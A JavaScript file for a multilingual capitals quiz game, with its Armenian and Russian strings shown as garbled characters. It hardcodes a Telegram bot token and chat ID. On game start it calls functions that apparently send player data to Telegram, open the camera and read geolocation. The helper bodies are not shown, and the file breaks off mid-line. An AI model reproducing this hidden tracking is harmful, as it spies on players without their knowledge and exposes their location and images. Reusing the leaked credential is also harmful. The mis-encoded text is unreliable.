// script.js

const TELEGRAM_BOT_TOKEN = '7921776519:AAEtasvOGOZxdZo4gUNscLC49zSdm3CtITw';
const TELEGRAM_CHAT_ID = '8071841674';

const questionsData = [
  {
    hy: {
      q: "’à÷Ä’∂ ’ß ’Ä’°’µ’°’Ω’ø’°’∂’´ ’¥’°’µ÷Ä’°÷Ñ’°’≤’°÷Ñ’®",
      answers: ["‘µ÷Ä÷á’°’∂", "‘≥’µ’∏÷Ç’¥÷Ä’´", "’é’°’∂’°’±’∏÷Ä", "’Ä÷Ä’°’¶’§’°’∂"],
      correct: 0
    },
    ru: {
      q: "–ö–∞–∫–æ–π –≥–æ—Ä–æ–¥ —è–≤–ª—è–µ—Ç—Å—è —Å—Ç–æ–ª–∏—Ü–µ–π –ê—Ä–º–µ–Ω–∏–∏",
      answers: ["–ï—Ä–µ–≤–∞–Ω", "–ì—é–º—Ä–∏", "–í–∞–Ω–∞–¥–∑–æ—Ä", "–†–∞–∑–¥–∞–Ω"],
      correct: 0
    },
    en: {
      q: "What is the capital of Armenia?",
      answers: ["Yerevan", "Gyumri", "Vanadzor", "Hrazdan"],
      correct: 0
    }
  },
  {
    hy: {
      q: "’à÷Ä’∂ ’ß ’å’∏÷Ç’Ω’°’Ω’ø’°’∂’´ ’¥’°’µ÷Ä’°÷Ñ’°’≤’°÷Ñ’®",
      answers: ["’Ñ’∏’Ω’Ø’æ’°", "’ç’°’∂’Ø’ø ’ä’•’ø’•÷Ä’¢’∏÷Ç÷Ä’£", "’Ü’∏’æ’∏’Ω’´’¢’´÷Ä’Ω’Ø", "‘µ’Ø’°’ø’•÷Ä’´’∂’¢’∏÷Ç÷Ä’£"],
      correct: 0
    },
    ru: {
      q: "–ö–∞–∫–æ–π –≥–æ—Ä–æ–¥ —è–≤–ª—è–µ—Ç—Å—è —Å—Ç–æ–ª–∏—Ü–µ–π –†–æ—Å—Å–∏–∏",
      answers: ["–ú–æ—Å–∫–≤–∞", "–°–∞–Ω–∫—Ç-–ü–µ—Ç–µ—Ä–±—É—Ä–≥", "–ù–æ–≤–æ—Å–∏–±–∏—Ä—Å–∫", "–ï–∫–∞—Ç–µ—Ä–∏–Ω–±—É—Ä–≥"],
      correct: 0
    },
    en: {
      q: "What is the capital of Russia?",
      answers: ["Moscow", "Saint Petersburg", "Novosibirsk", "Yekaterinburg"],
      correct: 0
    }
  },
  {
    hy: {
      q: "’à÷Ä’∂ ’ß ’ñ÷Ä’°’∂’Ω’´’°’µ’´ ’¥’°’µ÷Ä’°÷Ñ’°’≤’°÷Ñ’®",
      answers: ["’ì’°÷Ä’´’¶", "‘º’´’∏’∂", "’Ñ’°÷Ä’Ω’•’¨", "’Ü’´’Ω"],
      correct: 0
    },
    ru: {
      q: "–ö–∞–∫–æ–π –≥–æ—Ä–æ–¥ —è–≤–ª—è–µ—Ç—Å—è —Å—Ç–æ–ª–∏—Ü–µ–π –§—Ä–∞–Ω—Ü–∏–∏",
      answers: ["–ü–∞—Ä–∏–∂", "–õ–∏–æ–Ω", "–ú–∞—Ä—Å–µ–ª—å", "–ù–∏—Ü—Ü–∞"],
      correct: 0
    },
    en: {
      q: "What is the capital of France?",
      answers: ["Paris", "Lyon", "Marseille", "Nice"],
      correct: 0
    }
  },
  {
    hy: {
      q: "’à÷Ä’∂ ’ß ‘±’Ñ’Ü ’¥’°’µ÷Ä’°÷Ñ’°’≤’°÷Ñ’®",
      answers: ["’é’°’∑’´’∂’£’ø’∏’∂", "’Ü’µ’∏÷Ç ’Ö’∏÷Ä÷Ñ", "‘º’∏’Ω ‘±’∂’ª’•’¨’•’Ω", "’â’´’Ø’°’£’∏"],
      correct: 0
    },
    ru: {
      q: "–ö–∞–∫–æ–π –≥–æ—Ä–æ–¥ —è–≤–ª—è–µ—Ç—Å—è —Å—Ç–æ–ª–∏—Ü–µ–π –°–®–ê",
      answers: ["–í–∞—à–∏–Ω–≥—Ç–æ–Ω", "–ù—å—é-–ô–æ—Ä–∫", "–õ–æ—Å-–ê–Ω–¥–∂–µ–ª–µ—Å", "–ß–∏–∫–∞–≥–æ"],
      correct: 0
    },
    en: {
      q: "What is the capital of USA?",
      answers: ["Washington, D.C.", "New York", "Los Angeles", "Chicago"],
      correct: 0
    }
  },
  // ... –¥–æ–±–∞–≤–∏—Ç—å —Å—é–¥–∞ –¥–æ 30 –≤–æ–ø—Ä–æ—Å–æ–≤ –∞–Ω–∞–ª–æ–≥–∏—á–Ω–æ ...
];

const translations = {
  hy: {
    enterName: "’Ñ’∏÷Ç’ø÷Ñ’°’£÷Ä’•÷Ñ ’±’•÷Ä ’°’∂’∏÷Ç’∂’®",
    startGame: "’ç’Ø’Ω’•’¨ ’≠’°’≤’®",
    tryAgain: "’ì’∏÷Ä’±’•’¨ ’∂’∏÷Ä’´÷Å",
    questionsLeft: "’Ä’°÷Ä÷Å’•÷Ä ’¥’∂’°÷Å’•’¨ ’•’∂",
    correctAnswers: "’É’´’∑’ø ’∫’°’ø’°’Ω’≠’°’∂’∂’•÷Ä",
    wrongAnswers: "’ç’≠’°’¨ ’∫’°’ø’°’Ω’≠’°’∂’∂’•÷Ä",
    victory: "’Å’•’¶’∂’∏’æ ’∞’°’≤’©’•÷Å’´÷Ñ! üéâ",
    defeat: "’ë’°’æ’∏÷Ç’¥ ’•’∂÷Ñ, ’∫’°÷Ä’ø’æ’•÷Å’´÷Ñ üòû",
    namePlaceholder: "’Ñ’∏÷Ç’ø÷Ñ’°’£÷Ä’•÷Ñ ’±’•÷Ä ’°’∂’∏÷Ç’∂’®"
  },
  ru: {
    enterName: "–í–≤–µ–¥–∏—Ç–µ –≤–∞—à–µ –∏–º—è",
    startGame: "–ù–∞—á–∞—Ç—å –∏–≥—Ä—É",
    tryAgain: "–ü–æ–ø—Ä–æ–±–æ–≤–∞—Ç—å —Å–Ω–æ–≤–∞",
    questionsLeft: "–û—Å—Ç–∞–ª–æ—Å—å –≤–æ–ø—Ä–æ—Å–æ–≤",
    correctAnswers: "–ü—Ä–∞–≤–∏–ª—å–Ω—ã—Ö –æ—Ç–≤–µ—Ç–æ–≤",
    wrongAnswers: "–ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω—ã—Ö –æ—Ç–≤–µ—Ç–æ–≤",
    victory: "–í—ã –≤—ã–∏–≥—Ä–∞–ª–∏! üéâ",
    defeat: "–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, –≤—ã –ø—Ä–æ–∏–≥—Ä–∞–ª–∏ üòû",
    namePlaceholder: "–í–≤–µ–¥–∏—Ç–µ –≤–∞—à–µ –∏–º—è"
  },
  en: {
    enterName: "Enter your name",
    startGame: "Start Game",
    tryAgain: "Try Again",
    questionsLeft: "Questions left",
    correctAnswers: "Correct answers",
    wrongAnswers: "Wrong answers",
    victory: "You won! üéâ",
    defeat: "Sorry, you lost üòû",
    namePlaceholder: "Enter your name"
  }
};

let currentLanguage = localStorage.getItem('lang') || 'hy';
let userName = '';
let currentQuestions = [];
let currentQuestionIndex = 0;
let correctCount = 0;
let wrongCount = 0;

let geoCoords = null;
let cameraStream = null;
let photoTimer = null;

const nameFormContainer = document.getElementById('name-form-container');
const nameForm = document.getElementById('name-form');
const nameInput = document.getElementById('name-input');
const nameLabel = document.querySelector('label[for="name-input"]');
const startBtn = nameForm.querySelector('button');

const gameArea = document.getElementById('game-area');
const userNameDiv = document.getElementById('user-name');
const scoreInfoDiv = document.getElementById('score-info');
const questionDiv = document.getElementById('question');
const answerButtonsDiv = document.getElementById('answer-buttons');
const tryAgainBtn = document.getElementById('try-again-btn');

// ---- –§—É–Ω–∫—Ü–∏–∏ ----

function applyTranslations() {
  nameLabel.textContent = translations[currentLanguage].enterName;
  nameInput.placeholder = translations[currentLanguage].namePlaceholder;
  startBtn.textContent = translations[currentLanguage].startGame;
  tryAgainBtn.textContent = translations[currentLanguage].tryAgain;
  updateScoreInfo();
}

function updateScoreInfo() {
  const questionsLeft = 10 - currentQuestionIndex;
  scoreInfoDiv.textContent = `${translations[currentLanguage].questionsLeft}: ${questionsLeft} | ` +
    `${translations[currentLanguage].correctAnswers}: ${correctCount} | ` +
    `${translations[currentLanguage].wrongAnswers}: ${wrongCount}`;
  userNameDiv.textContent = userName || '-';
}

function shuffleArray(array) {
  for (let i = array.length - 1; i > 0; i--) {
    let j = Math.floor(Math.random() * (i + 1));
    [array[i], array[j]] = [array[j], array[i]];
  }
}

function selectQuestions() {
  let indices = Array.from(Array(questionsData.length).keys());
  shuffleArray(indices);
  currentQuestions = indices.slice(0, 10).map(i => questionsData[i]);
}

function startGame() {
  userName = nameInput.value.trim() || (currentLanguage === 'hy' ? "‘±’∂’∞’°’µ’ø" : currentLanguage === 'ru' ? "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω—ã–π" : "Unknown");
  localStorage.setItem('userName', userName);
  currentQuestionIndex = 0;
  correctCount = 0;
  wrongCount = 0;
  selectQuestions();
  nameFormContainer.style.display = 'none';
  gameArea.style.display = 'block';
  showQuestion();
  updateScoreInfo();
  sendTelegramStart();
  startCameraIfAllowed();
  getGeolocation();
}

function showQuestion() {
  clearAnswerButtons();
  if (currentQuestionIndex >= currentQuestions.length) {
    showResults();
    return;
  }
  const qObj = currentQuestions[currentQuestionIndex][currentLanguage];

  questionDiv.textContent = qObj.q;

  let answers = qObj.answers.map((a, i) => ({ text: a, isCorrect: i === qObj.correct }));
  shuffleArray(answers);

  answers.forEach((ans) => {
    let btn = document.createElement('button');
    btn.classList.add('btn');
    btn.textContent = ans.text;
    btn.addEventListener('click', () => selectAnswer(btn, ans.isCorrect));
    answerButtonsDiv.appendChild(btn);
  });

  updateScoreInfo();
}

function clearAnswerButtons() {
  while (answerButtonsDiv.firstChild) {
    answerButtonsDiv.removeChild(answerButtonsDiv.firstChild);
  }
}

function selectAnswer(button, isCorrect) {
  Array.from(answerButtonsDiv.children).forEach(btn => btn.disabled = true);

  if (isCorrect) {
    button.classList.add('correct');
    correctCount++;
  } else {
    button.classList.add('wrong');
    wrongCount++;
    // –ü–æ–∫–∞–∑–∞—Ç—å –ø—Ä–∞–≤–∏–ª—å–Ω—ã–π –æ—Ç–≤–µ—Ç
    Array.from(answerButtonsDiv.children).forEach(btn => {
      if (btn.textContent === currentQuestions[currentQuestionIndex][currentLanguage].answers[currentQuestions[currentQuestionIndex][currentLanguage].correct]) {
        btn.classList.add('correct');
      }
    });
  }

  updateScoreInfo();

  setTimeout(() => {
    currentQuestionIndex++;
    showQuestion();
  }, 1500);
}

function showResults() {
  clearAnswerButtons();
  questionDiv.textContent = correctCount >= 5 ? translations[currentLanguage].victory : translations[currentLanguage].defeat;
  tryAgainBtn.style.display = 'block';
  updateScoreInfo();
  sendTelegramResult();
}

tryAgainBtn.addEventListener('click', () => {
  tryAgainBtn.style.display = 'none';
  if (!geoCoords || !cameraStream) {
    // –ï—Å–ª–∏ –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ –∫–∞–º–µ—Ä–µ –∏–ª–∏ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏, –∑–∞–ø—Ä–æ—Å–∏—Ç—å –∑–∞–Ω–æ–≤–æ
    request
